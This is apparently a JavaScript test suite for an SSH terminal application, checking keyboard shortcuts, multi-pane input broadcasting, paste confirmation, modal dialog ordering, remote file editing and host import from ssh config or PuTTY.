test('AltGr (Ctrl+Alt) and Meta never trigger a Ctrl shortcut, copy included', () => {
  const altgr = { ctrlKey: true, altKey: true }
  for (const code of ['Digit0', 'Minus', 'Equal', 'KeyC', 'Digit7', 'Tab']) {
    assert.equal(terminalKeyAction(key(code, altgr)), 'pass', code)
    assert.equal(appShortcut(key(code, altgr)), null, code)
  }
  assert.equal(terminalKeyAction(key('KeyC', { ctrlKey: true, altKey: true, shiftKey: true })), 'pass')
  assert.equal(terminalKeyAction(key('Digit1', { ctrlKey: true, metaKey: true })), 'pass')
})

test('zoom leaves Ctrl+_ (Ctrl+Shift+Minus) to the shell', () => {
  assert.equal(terminalKeyAction(key('Minus', { ctrlKey: true })), 'zoomOut')
  assert.equal(terminalKeyAction(key('Minus', { ctrlKey: true, shiftKey: true }, '_')), 'pass')
  assert.equal(terminalKeyAction(key('Equal', { ctrlKey: true, shiftKey: true }, '+')), 'zoomIn')
  assert.equal(terminalKeyAction(key('Digit0', { ctrlKey: true })), 'zoomReset')
  assert.equal(terminalKeyAction(key('KeyC', { ctrlKey: true })), 'copyOrInterrupt')
  assert.equal(terminalKeyAction(key('KeyC', { ctrlKey: true, shiftKey: true })), 'copy')
  assert.equal(terminalKeyAction(key('KeyV', { ctrlKey: true, shiftKey: true })), 'paste')
})

test('broadcast mirrors only user input, never terminal replies or mouse reports', () => {
  const replies = [
    '\x1b[?1;2c', '\x1b[>0;276;0c', '\x1b[0n', '\x1b[12;5R', '\x1b[?12;5R', '\x1b[?2004;1$y',
    '\x1b[I', '\x1b[O', '\x1b[8;24;80t', '\x1b]11;rgb:1e1e/1e1e/1e1e\x1b\\', '\x1b]10;rgb:ffff/ffff/ffff\x07',
    '\x1bP1$r0m\x1b\\',
  ]
  for (const r of replies) {
    assert.ok(looksLikeTerminalReply(r), JSON.stringify(r))
    // xterm says "not user input" for these; and without the flag the shape decides.
    assert.equal(shouldBroadcast(r, false), false)
    assert.equal(shouldBroadcast(r, null), false)
  }
  for (const m of ['\x1b[<0;12;5M', '\x1b[<0;12;5m', '\x1b[32;12;5M', '\x1b[M !!']) {
    assert.ok(isMouseReport(m), JSON.stringify(m))
    // Mouse reports are user-made but name a position in THIS pane.
    assert.equal(shouldBroadcast(m, true), false)
  }
  for (const typed of ['l', 's', '\r', '\x1b[A', '\x1b[1;5C', '\x03', 'show run\r']) {
    assert.equal(shouldBroadcast(typed, true), true)
    assert.equal(shouldBroadcast(typed, null), true)
  }
  // Shift+F3 has the shape of a cursor report; the origin flag keeps it.
  assert.equal(shouldBroadcast('\x1b[1;2R', true), true)
})

test('a multi-line paste without bracketed paste needs a confirm', () => {
  assert.deepEqual(planPaste('show ver', false), { kind: 'paste' })
  assert.deepEqual(planPaste('a\nb\nc', false), { kind: 'confirm', lines: 2 })
  assert.deepEqual(planPaste('a\r\nb\r\n', false), { kind: 'confirm', lines: 2 })
  // A single trailing newline still runs the line.
  assert.deepEqual(planPaste('reload\n', false), { kind: 'confirm', lines: 1 })
  // Bracketed: inert until Enter.
  assert.deepEqual(planPaste('a\nb', true), { kind: 'paste' })
})

test('snippets press Enter as CR, like the keyboard', () => {
  assert.equal(snippetText('show ip int brief', true), 'show ip int brief\r')
  assert.equal(snippetText('show ip int brief', false), 'show ip int brief')
})

test('Escape and Enter act on the top modal only', () => {
  const st = new ModalStack()
  const editor = st.push()
  const alert = st.push()
  assert.ok(st.isTop(alert) && !st.isTop(editor))
  assert.equal(st.size, 2)
  st.remove(alert)
  assert.ok(st.isTop(editor))
  st.remove(editor)
  assert.equal(st.size, 0)
  assert.ok(!st.isTop(editor))
})

test('Enter on a focused Cancel cancels, in every kind of dialog', () => {
  for (const kind of ['confirm', 'prompt']) {
    for (const danger of [false, true]) {
      assert.equal(enterOutcome(kind, danger, 'cancel'), 'cancel', `${kind} ${danger}`)
      assert.equal(enterOutcome(kind, danger, 'confirm'), 'confirm')
    }
  }
  assert.equal(enterOutcome('confirm', false, 'other'), 'confirm')
  assert.equal(enterOutcome('confirm', true, 'other'), 'none')
  assert.equal(enterOutcome('prompt', false, 'input'), 'confirm')
  assert.equal(enterOutcome('alert', false, 'other'), 'confirm')
})

test('a click counts only when this dialog saw both its pointerdown and pointerup', () => {
  // Deliberate single click, however quick: down + up + click(detail 1).
  const g = new PressGuard()
  g.pointerDown()
  g.pointerUp()
  assert.ok(g.accepts(1))
  // Pressed on the previous dialog, released on this one: no down seen.
  const late = new PressGuard()
  late.pointerUp()
  assert.ok(!late.accepts(1))
  // The second click of a double-click aimed at the previous dialog: both
  // halves land here, but it is click 2 of a series this dialog saw 1 of.
  const dbl = new PressGuard()
  dbl.pointerDown()
  dbl.pointerUp()
  assert.ok(!dbl.accepts(2))
  // Pressed but not yet released (a synthetic click mid-press): refused.
  const held = new PressGuard()
  held.pointerDown()
  assert.ok(!held.accepts(1))
  // A double-click entirely on this dialog: its first click counts.
  const own = new PressGuard()
  own.pointerDown()
  own.pointerUp()
  assert.ok(own.accepts(1))
  // Keyboard activation (detail 0) always counts.
  assert.ok(new PressGuard().accepts(0))
})

test('the modal on top is decided by tier, not by registration order', () => {
  const st = new ModalStack()
  const quit = st.push(LAYER.dialog)
  // A host-key prompt arriving later is above it (and painted above it).
  const hostKey = st.push(LAYER.sshPrompt)
  assert.ok(st.isTop(hostKey) && !st.isTop(quit))
  // A confirm raised while the SSH prompt is up stays under it.
  const paste = st.push(LAYER.dialog)
  assert.ok(st.isTop(hostKey) && !st.isTop(paste))
  st.remove(hostKey)
  // Same tier: the later one is on top.
  assert.ok(st.isTop(paste) && !st.isTop(quit))
  // A lower tier opened later does not jump above a higher one.
  const menu = st.push(LAYER.menu)
  assert.ok(st.isTop(paste) && !st.isTop(menu))
  st.remove(paste)
  st.remove(quit)
  assert.ok(st.isTop(menu))
  assert.ok(!st.isTop(0))
  // Tiers agree with the CSS z-index order the components use.
  assert.ok(LAYER.panel < LAYER.menu && LAYER.menu < LAYER.dialog && LAYER.dialog < LAYER.aiWarning && LAYER.aiWarning < LAYER.sshPrompt)
})

test('closing the window asks only with live sessions and the setting on', () => {
  const s = [{ status: 'connected' }, { status: 'disconnected' }, { status: 'connecting' }, { status: 'error' }]
  assert.equal(liveSessionCount(s), 2)
  assert.match(closeConfirmText(s, true), /2 sessions are still connected/)
  assert.equal(closeConfirmText(s, false), null)
  assert.equal(closeConfirmText([{ status: 'disconnected' }], true), null)
  assert.match(closeConfirmText([{ status: 'connected' }], true), /1 session is/)
})

const H = (id, extra = {}) => ({ kind: 'host', id, name: id, hostname: `${id}.lan`, port: 22, username: 'u', auth: 'password', ...extra })
const F = (id, name, children, color) => ({ kind: 'folder', id, name, children, ...(color ? { color } : {}) })

test("the 'off' colour never overrides a red folder", () => {
  const tree = [F('prod', 'Production', [H('a', { color: 'none' }), H('b'), H('c', { color: 'blue' })], 'red'), H('top')]
  assert.equal(ownColor('none'), undefined)
  assert.equal(effectiveHostColor(tree, 'a'), 'red')
  assert.equal(effectiveHostColor(tree, 'b'), 'red')
  assert.equal(effectiveHostColor(tree, 'c'), 'blue')
  assert.equal(effectiveHostColor(tree, 'top'), undefined)
  assert.equal(effectiveHostColor(tree, 'missing'), undefined)
  assert.equal(inheritedHostColor(tree, 'c'), 'red')
  // Nested: the nearest coloured folder wins; an 'off' folder passes it through.
  const nested = [F('o', 'Outer', [F('i', 'Inner', [H('x')], 'none')], 'red')]
  assert.equal(effectiveHostColor(nested, 'x'), 'red')
})

test('a jump host knows its dependents; duplicate folder names get paths', () => {
  const tree = [H('bastion'), H('db1', { jumpHostId: 'bastion' }), F('f', 'Sites', [H('db2', { jumpHostId: 'bastion' })]), H('self', { jumpHostId: 'self' })]
  assert.deepEqual(jumpDependents(tree, 'bastion').map((h) => h.id), ['db1', 'db2'])
  assert.deepEqual(jumpDependents(tree, 'self'), [])
  const folders = [F('e', 'East', [F('l1', 'Lab', [])]), F('w', 'West', [F('l2', 'Lab', [])]), F('u', 'Unique', [])]
  const labels = folderLabels(folders)
  assert.equal(labels.get('l1'), 'East / Lab')
  assert.equal(labels.get('l2'), 'West / Lab')
  assert.equal(labels.get('u'), 'Unique')
  const twins = folderLabels([F('a', 'Lab', []), F('b', 'Lab', [])])
  assert.notEqual(twins.get('a'), twins.get('b'))
})

test('buffered pane text survives a StrictMode remount and keeps its order', async () => {
  emitLocal('s-sm', 'one ')
  const first = []
  const off = onLocal('s-sm', (t) => first.push(t))
  off() // StrictMode: the first mount is thrown away at once
  const second = []
  onLocal('s-sm', (t) => second.push(t))
  emitLocal('s-sm', 'two')
  await Promise.resolve()
  assert.deepEqual(first, [])
  assert.deepEqual(second, ['one ', 'two'])
  // With nobody subscribed when the flush runs, the text is kept for later.
  emitLocal('s-sm2', 'later')
  const off2 = onLocal('s-sm2', () => {})
  off2()
  await Promise.resolve()
  assert.ok(hasPendingLocal('s-sm2'))
  clearLocal('s-sm')
  clearLocal('s-sm2')
})

test('the key path example follows the platform', () => {
  assert.equal(keyPathPlaceholder(false), '~/.ssh/id_ed25519')
  assert.match(keyPathPlaceholder(true), /^C:\\/)
})

test('a progress note is kept on the active row', () => {
  const row = { ...queuedRow('t1', 's1', 'upload', { name: 'f', path: '/l/f', dest: '/r/f', overwrite: 'never' }), status: 'active' }
  let list = applyProgress([row], { sessionId: 's1', transferId: 't1', root: '/l/f', filePath: '/l/f', bytesTransferred: 1, totalBytes: 9, direction: 'upload', done: false, note: 'writing in place' })
  assert.equal(list[0].note, 'writing in place')
  list = applyProgress(list, { sessionId: 's1', transferId: 't1', root: '/l/f', filePath: '/l/f', bytesTransferred: 5, totalBytes: 9, direction: 'upload', done: false })
  assert.equal(list[0].note, 'writing in place')
  assert.equal(list[0].bytesDone, 5)
})

/* ------------------------------------------------------------------ W5b */

test('tab chords follow the produced character; AZERTY Ctrl+_ reaches the shell', () => {
  // French AZERTY: Digit8 produces "_" without Shift; Ctrl+_ is readline undo.
  assert.equal(appShortcut(key('Digit8', { ctrlKey: true }, '_'), 9), null)
  assert.equal(terminalKeyAction(key('Digit8', { ctrlKey: true }, '_'), 9), 'pass')
  // Digit1 is "&" there: not a tab chord either.
  assert.equal(appShortcut(key('Digit1', { ctrlKey: true }, '&')), null)
  // A layout whose digit comes from another physical key: by e.key.
  assert.deepEqual(appShortcut(key('KeyQ', { ctrlKey: true }, '3')), { kind: 'gotoTab', index: 2 })
  // e.key not printable: fall back to the physical key.
  assert.deepEqual(appShortcut(key('Digit4', { ctrlKey: true }, 'Unidentified')), { kind: 'gotoTab', index: 3 })
  assert.deepEqual(appShortcut(key('Digit4', { ctrlKey: true }, 'Dead')), { kind: 'gotoTab', index: 3 })
  // Numpad digits are never tab chords.
  assert.equal(appShortcut(key('Numpad2', { ctrlKey: true }, '2')), null)
  // Snippet slots stay on the physical key (US "@", AZERTY "2").
  assert.deepEqual(appShortcut(key('Digit2', { ctrlKey: true, shiftKey: true }, '@'), 1), { kind: 'snippet', slot: 2 })
  assert.deepEqual(appShortcut(key('Digit2', { ctrlKey: true, shiftKey: true }, '2'), 1), { kind: 'snippet', slot: 2 })
})

test('a tab chord for a tab that does not exist is left to the terminal', () => {
  assert.deepEqual(appShortcut(key('Digit3', { ctrlKey: true }), 3), { kind: 'gotoTab', index: 2 })
  assert.equal(appShortcut(key('Digit4', { ctrlKey: true }), 3), null)
  assert.equal(terminalKeyAction(key('Digit4', { ctrlKey: true }), 3), 'pass')
  assert.equal(terminalKeyAction(key('Digit3', { ctrlKey: true }), 3), 'app')
  assert.equal(terminalKeyAction(key('Digit1', { ctrlKey: true }), 0), 'pass')
  // Without a count (unknown), every digit chord is still the app's.
  assert.equal(terminalKeyAction(key('Digit9', { ctrlKey: true })), 'app')
})

test('multi-line paste, AI insert text and snippets are never broadcast', () => {
  // One plain line is mirrored as typed (unframed).
  assert.equal(pasteMirrorText('show run'), 'show run')
  // Any line break, or any other control character: this pane only.
  for (const t of ['a\nb', 'a\r', 'conf t\r\nint g0/1\r\n', 'x\x1b[201~y', 'a\tb', '\x7f', '']) {
    assert.equal(pasteMirrorText(t), null, JSON.stringify(t))
  }
  // Snippets: one line goes to every sibling, several lines to the source only.
  assert.deepEqual(snippetTargets('reload', ['b', 'c']), { targets: ['b', 'c'], localOnly: false })
  assert.deepEqual(snippetTargets('conf t\nno ip route', ['b', 'c']), { targets: [], localOnly: true })
  assert.deepEqual(snippetTargets('conf t\nend', []), { targets: [], localOnly: false })
  // After the confirm: only approved siblings that are still targets.
  assert.deepEqual(stillApproved(['b', 'c', 'd'], ['c', 'd', 'e']), ['c', 'd'])
  assert.deepEqual(stillApproved([], ['a']), [])
})

test('the paste mode is re-checked right before writing', () => {
  const text = 'line1\nline2'
  // Bracketed when planned, then switched off while a dialog was open:
  // the multi-line confirm is needed now.
  assert.equal(pasteNeedsConfirmNow(text, true, false), false)
  assert.equal(pasteNeedsConfirmNow(text, false, false), true)
  // Once confirmed, either mode is fine.
  assert.equal(pasteNeedsConfirmNow(text, false, true), false)
  // One line never needs it.
  assert.equal(pasteNeedsConfirmNow('ls', false, false), false)
  // ignoreBracketedPasteMode makes xterm send it unframed.
  assert.equal(bracketedNow({ modes: { bracketedPasteMode: true }, options: {} }), true)
  assert.equal(bracketedNow({ modes: { bracketedPasteMode: true }, options: { ignoreBracketedPasteMode: true } }), false)
  assert.equal(bracketedNow({ modes: { bracketedPasteMode: false }, options: {} }), false)
})

test('the passphrase guard judges the effective vault slot', () => {
  setVaultFoldsCase(true)
  try {
    // Two borrowers of a deleted lender share the slot with each other.
    const orphans = [H('a', { credentialId: 'gone' }), H('b', { credentialId: 'gone' })]
    const r = vaultSlotSharing(orphans, orphans[0])
    assert.ok(r.shared && r.orphaned && !r.lender)
    assert.deepEqual(r.others.map((h) => h.id), ['b'])
    // A lone borrower of a deleted lender: still someone else's slot.
    assert.ok(vaultSlotSharing([H('a', { credentialId: 'gone' })], { id: 'a', credentialId: 'gone' }).shared)
    // Case-variant lender id, where the vault folds case.
    const cv = [H('Core1'), H('edge', { credentialId: 'core1' })]
    const e = vaultSlotSharing(cv, cv[1])
    assert.equal(e.lender?.id, 'Core1')
    assert.ok(e.shared && !e.orphaned)
    // The lender sees its (case-variant) borrower.
    assert.deepEqual(vaultSlotSharing(cv, cv[0]).others.map((h) => h.id), ['edge'])
    // Own slot, nobody else: not shared.
    assert.ok(!vaultSlotSharing([H('solo'), H('other')], H('solo')).shared)
    // Pointing at its own id is its own slot.
    assert.ok(!vaultSlotSharing([H('solo', { credentialId: 'solo' })], { id: 'solo', credentialId: 'solo' }).shared)
  } finally {
    setVaultFoldsCase(true)
  }
})

/* ---------------------------------------------------------- remote editing */
import {
  MAX_EDIT_BYTES, applyClosed, applyEdit, applyList, conflictCopyName, conflictPromptDue, discardPrompt,
  editBlockReason, editOffered, editStatusLabel, emptyEdits, mergeLeftovers,
} from './remoteEdit.ts'

const editInfo = (over = {}) => ({
  editId: 'e-1', sessionId: 's1', remotePath: '/etc/app.conf', localPath: '/x/app.conf', name: 'app.conf',
  status: 'synced', message: null, dirty: false, bytes: 3, lastSync: 1, conflictSeq: 0, opener: 'default', ...over,
})

test('edit is offered for files and links, and capped at 20 MB', () => {
  assert.equal(MAX_EDIT_BYTES, 20 * 1024 * 1024)
  assert.ok(editOffered({ kind: 'file' }))
  assert.ok(editOffered({ kind: 'symlink' }))
  assert.ok(!editOffered({ kind: 'directory' }))
  assert.equal(editBlockReason({ kind: 'file', size: MAX_EDIT_BYTES, name: 'a' }), null)
  assert.match(editBlockReason({ kind: 'file', size: MAX_EDIT_BYTES + 1, name: 'big.log' }), /big\.log is 21 MB.*over 20 MB/)
  // A link's listed size is its own; the backend checks what it points at.
  assert.equal(editBlockReason({ kind: 'symlink', size: MAX_EDIT_BYTES * 4, name: 'l' }), null)
  assert.ok(editBlockReason({ kind: 'directory', size: 0, name: 'd' }))
})

test('edit events update rows in place and never revive an ended edit', () => {
  let s = applyEdit(emptyEdits(), editInfo())
  s = applyEdit(s, editInfo({ editId: 'e-2', name: 'b' }))
  s = applyEdit(s, editInfo({ status: 'uploading' }))
  assert.deepEqual(s.edits.map((e) => [e.editId, e.status]), [['e-1', 'uploading'], ['e-2', 'synced']])
  s = applyClosed(s, { editId: 'e-1' })
  assert.deepEqual(s.edits.map((e) => e.editId), ['e-2'])
  // A status event already in flight when it ended, and a stale list.
  s = applyEdit(s, editInfo({ status: 'synced' }))
  s = applyList(s, [editInfo(), editInfo({ editId: 'e-2' })])
  assert.deepEqual(s.edits.map((e) => e.editId), ['e-2'])
})

test('Keep editing dismisses one conflict; the next one prompts again', () => {
  const c1 = editInfo({ status: 'conflict', conflictSeq: 1 })
  assert.ok(conflictPromptDue(c1, {}))
  const dismissed = { 'e-1': 1 }
  assert.ok(!conflictPromptDue(c1, dismissed))
  assert.ok(conflictPromptDue({ ...c1, conflictSeq: 2 }, dismissed))
  assert.ok(!conflictPromptDue(editInfo({ conflictSeq: 2 }), {}), 'not in conflict')
})

test('edit rows name their state, and the prompts name the file', () => {
  assert.equal(editStatusLabel({ status: 'synced', dirty: false }), 'synced')
  assert.equal(editStatusLabel({ status: 'synced', dirty: true }), 'changed')
  assert.equal(editStatusLabel({ status: 'uploading', dirty: true }), 'uploading…')
  assert.equal(editStatusLabel({ status: 'conflict', dirty: true }), 'conflict')
  assert.equal(editStatusLabel({ status: 'error', dirty: true }), 'error')
  assert.equal(conflictCopyName('nginx.conf'), 'nginx.conf.conflict')
  assert.match(discardPrompt(editInfo()), /app\.conf has changes that were not uploaded to \/etc\/app\.conf/)
})

test('kept copies merge by id, the backend list first', () => {
  const a = { id: 's/a', remotePath: '/a', localPath: '/l/a', name: 'a' }
  const b = { id: 's/b', remotePath: '/b', localPath: '/l/b', name: 'b' }
  assert.deepEqual(mergeLeftovers([a], [b, { ...a, name: 'A' }]).map((l) => [l.id, l.name]), [['s/b', 'b'], ['s/a', 'A']])
})

/* ------------------------------------------ ssh config / PuTTY import */

import { buildImport, importFolderName, planImport } from './tree.ts'

const scanned = (over) => ({
  name: 'h', hostname: 'h.example', port: 22, user: 'me', keyPath: null, jump: null, warnings: [], origin: 'config:1',
  ...over,
})
const report = (hosts, localUser = 'local') => ({
  source: 'ssh-config', hosts, warnings: [], skipped: [], unsupportedKeys: [], filesRead: [], localUser,
})
const existingCatalogue = () => [
  {
    kind: 'folder', id: 'f-1', name: 'Prod', children: [
      { kind: 'host', id: 'h-bastion', name: 'Old bastion', hostname: 'Bastion.Example', port: 22, username: 'ops', auth: 'agent' },
    ],
  },
  { kind: 'host', id: 'h-web', name: 'web', hostname: 'web.example', port: 2222, username: 'deploy', auth: 'password' },
]
const allOf = (nodes) => nodes.flatMap((n) => (n.kind === 'folder' ? allOf(n.children) : [n]))

test('import preview: duplicates by host+port+user are unchecked, user defaults to local', () => {
  const rows = planImport(
    report([
      scanned({ name: 'web', hostname: 'WEB.example', port: 2222, user: 'deploy' }),
      scanned({ name: 'web-other-user', hostname: 'web.example', port: 2222, user: 'root' }),
      scanned({ name: 'nouser', hostname: 'n.example', user: null }),
      scanned({ name: 'warned', warnings: ['ProxyCommand is not supported'] }),
    ]),
    existingCatalogue(),
  )
  assert.deepEqual(rows.map((r) => [r.status, r.checked]), [
    ['duplicate', false], ['new', true], ['new', true], ['warning', true],
  ])
  assert.deepEqual(rows[0].duplicateOf, { id: 'h-web', name: 'web' })
  assert.equal(rows[2].username, 'local')
  assert.equal(rows[2].userDefaulted, true)
  const noLocal = planImport(report([scanned({ user: null })], ''), [])
  assert.equal(noLocal[0].status, 'warning')
  assert.equal(importFolderName('putty'), 'Imported (PuTTY)')
  assert.equal(importFolderName('ssh-config'), 'Imported (ssh config)')
})

test('import build: fresh ids, new folder, address fields only, no secrets or risky fields', () => {
  const existing = existingCatalogue()
  const rows = planImport(report([
    scanned({ name: 'a', hostname: 'a.example', keyPath: '/home/me/.ssh/id' }),
    scanned({ name: 'b', hostname: 'b.example' }),
  ]), existing)
  const { catalogue, added } = buildImport(rows, new Set([0, 1]), existing, { kind: 'new-folder', name: 'Imported (ssh config)' }, 'local')
  assert.equal(added, 2)
  assert.equal(catalogue.length, 3)
  assert.deepEqual(catalogue.slice(0, 2), existing)
  const folder = catalogue[2]
  assert.equal(folder.kind, 'folder')
  assert.equal(folder.name, 'Imported (ssh config)')
  const [a, b] = folder.children
  assert.equal(a.auth, 'key')
  assert.equal(a.keyPath, '/home/me/.ssh/id')
  assert.equal(b.auth, 'password')
  for (const n of [folder, a, b]) assert.ok(usableImportedId(n.id) && !n.id.includes('\u0000'), n.id)
  assert.equal(new Set([folder.id, a.id, b.id, 'f-1', 'h-bastion', 'h-web']).size, 6)
  const allowed = new Set(['kind', 'id', 'name', 'hostname', 'port', 'username', 'auth', 'keyPath', 'jumpHostId'])
  for (const h of [a, b]) {
    for (const [k, v] of Object.entries(h)) if (v !== undefined) assert.ok(allowed.has(k), `unexpected field ${k}`)
    assert.equal(h.aiAllowed, undefined) // default colour policy
    assert.equal(h.credentialId, undefined)
  }
  // Unchecked rows are not imported; top-level and existing-folder targets.
  const top = buildImport(rows, new Set([1]), existing, { kind: 'top' }, 'local')
  assert.equal(top.added, 1)
  assert.equal(top.catalogue.length, 3)
  assert.equal(top.catalogue[2].name, 'b')
  const into = buildImport(rows, new Set([0]), existing, { kind: 'folder', id: 'f-1' }, 'local')
  assert.equal(into.catalogue.length, 2)
  assert.deepEqual(into.catalogue[0].children.map((h) => h.name), ['Old bastion', 'a'])
})

test('import build: jump hosts link to the import, an existing host, or a created entry', () => {
  const existing = existingCatalogue()
  const rows = planImport(report([
    scanned({ name: 'bastion', hostname: 'bastion.internal', user: 'jump' }),
    scanned({ name: 'app', hostname: 'app.internal', jump: { kind: 'alias', alias: 'bastion' } }),
    scanned({ name: 'viaold', hostname: 'x.internal', jump: { kind: 'literal', host: 'bastion.example', port: 22, user: 'ops' } }),
    scanned({ name: 'vianew1', hostname: 'y.internal', jump: { kind: 'literal', host: 'gw.example', port: 2222, user: null } }),
    scanned({ name: 'vianew2', hostname: 'z.internal', jump: { kind: 'literal', host: 'GW.example', port: 2222, user: 'local' } }),
    scanned({ name: 'viarow', hostname: 'w.internal', jump: { kind: 'literal', host: 'bastion.internal', port: 22, user: 'jump' } }),
    scanned({ name: 'dupjump', hostname: 'web.example', port: 2222, user: 'deploy' }),
    scanned({ name: 'viadup', hostname: 'v.internal', jump: { kind: 'alias', alias: 'dupjump' } }),
  ]), existing)
  assert.equal(rows[2].jumpLabel, 'Old bastion (existing)')
  assert.equal(rows[3].jumpLabel, 'local@gw.example:2222 (new)')
  assert.equal(rows[5].jumpLabel, 'bastion')
  assert.equal(rows[6].checked, false)
  const checked = new Set(rows.filter((r) => r.checked).map((r) => r.index))
  const { catalogue, added, notes } = buildImport(rows, checked, existing, { kind: 'new-folder', name: 'Imported' }, 'local')
  const hosts = allOf(catalogue)
  const by = (name) => hosts.find((h) => h.name === name)
  assert.equal(by('app').jumpHostId, by('bastion').id)
  assert.equal(by('viaold').jumpHostId, 'h-bastion')
  assert.equal(by('viarow').jumpHostId, by('bastion').id)
  // One created jump host for the same endpoint, shared.
  const gw = by('local@gw.example:2222')
  assert.ok(gw)
  assert.equal(by('vianew1').jumpHostId, gw.id)
  assert.equal(by('vianew2').jumpHostId, gw.id)
  // An alias that duplicates an existing host links to that host.
  assert.equal(by('viadup').jumpHostId, 'h-web')
  assert.equal(added, 8) // 7 checked + 1 created jump host
  assert.ok(notes.some((n) => n.includes('created jump host')))
  // Every jumpHostId points at a host that exists in the result.
  const ids = new Set(hosts.map((h) => h.id))
  for (const h of hosts) if (h.jumpHostId) assert.ok(ids.has(h.jumpHostId), `${h.name} -> ${h.jumpHostId}`)
  // A jump alias left unchecked is dropped with a note.
  const partial = buildImport(rows, new Set([1]), existing, { kind: 'top' }, 'local')
  assert.equal(allOf(partial.catalogue).find((h) => h.name === 'app').jumpHostId, undefined)
  assert.ok(partial.notes.some((n) => n.includes('was not selected')))
})
